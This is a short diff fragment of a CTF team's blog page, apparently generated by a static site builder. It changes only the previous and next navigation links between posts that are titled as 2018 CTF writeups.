-                <a class="post-action-btn btn btn--default tooltip--top" href="https://Team-Eur3kA.github.io/2018/03/n1ctf-2018-network-card-writeup/" data-tooltip="N1CTF 2018 Network Card Writeup">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -653,7 +701,7 @@ if __name__ == '__main__':
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://Team-Eur3kA.github.io/2018/02/codegate-2018-7amebox1-writeup/" data-tooltip="CodeGate 2018 7amebox1 Writeup">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Team-Eur3kA.github.io/2018/03/n1ctf-2018-memsafety-writeup/" data-tooltip="N1CTF-2018 memsafety Writeup">
               
                   <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                   <i class="fa fa-angle-right"></i>
